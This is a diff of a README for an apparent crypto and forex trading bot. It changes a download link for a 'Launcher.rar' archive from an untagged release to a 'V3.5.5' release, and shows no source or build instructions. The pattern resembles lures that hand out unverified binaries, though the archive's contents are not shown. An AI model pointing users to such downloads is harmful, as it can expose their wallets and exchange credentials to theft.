@@ -1,5 +1,5 @@
 # Crypto, Forex Trading Bot
-# [Download](https://github.com/ali20042004/Auto-Trading-Bot/releases/download/untagged-fad3c0b526b1085a6238/Launcher.rar)
+# [Download](https://github.com/ali20042004/Auto-Trading-Bot/releases/download/V3.5.5/Launcher.rar)
 
 ## Works with:
 Binance
